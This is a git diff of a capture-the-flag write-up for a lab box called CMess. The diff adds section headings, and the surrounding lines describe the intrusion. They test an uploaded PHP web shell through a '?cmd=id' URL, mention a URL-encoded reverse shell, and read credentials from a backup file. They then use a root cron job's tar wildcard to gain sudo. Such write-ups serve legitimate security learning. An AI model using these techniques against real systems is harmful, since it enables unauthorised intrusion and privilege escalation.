@@ -142,6 +142,8 @@ it should look something like this:
 
 ![cmd](https://github.com/realatharva15/cmess_writeup/blob/main/images/cmdbetter.png)
 
+# Phase 2 - Initial Foothold:
+
 now save this file and then test for RCE at the url http://cmess.thm/tmp/shell.php7?cmd=id
 ```bash
 #in your browser:
@@ -150,6 +152,8 @@ http://cmess.thm/tmp/shell.php7?cmd=id
 ![RCE](https://github.com/realatharva15/cmess_writeup/blob/main/images/RCEbetter.png)
 
 and just like that we have achieved RCE through malicious file upload! we will now craft a reverseshell payload which will be url encoded and inject it in the url.
+
+# Shell as www-data:
 
 ```bash
 #put your actual attacker ip:
@@ -193,6 +197,8 @@ this is a clear hint that our way to privilege escalation from www-data to andre
 
 ![database](https://github.com/realatharva15/cmess_writeup/blob/main/images/database.png)
 
+# Shell as andre:
+
 i remembered that in the description of the CTF, there was mentioning of not using bruteforce. so we fall inside a rabbit hole. 
 
 after getting tired of manual enumeration, i installed linpeas.sh on the system and got a sus file at the /opt directory. there is a .password.bak file which contains the credentials of user andre. we quickly ssh into the system to get a better shell and a decent tty.
@@ -204,6 +210,8 @@ ssh andre@cmess.thm
 now we have a shell as andre. lets read and submit the user.txt flag and lets get going. in the same linpeas output, we found a cronjob running every two minutes as root! after closer inspection i found out that it uses the tar command. this is a serious vulnerability which can help us get a root shell through tar wildcard injection. 
 
 `*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *`
+
+# Phase 3 - ROOT access:
 
 now for the exploit, we will have to create an exploit.sh file with some malicious commands which will add us to the sudoers file at /etc/sudoers.
 
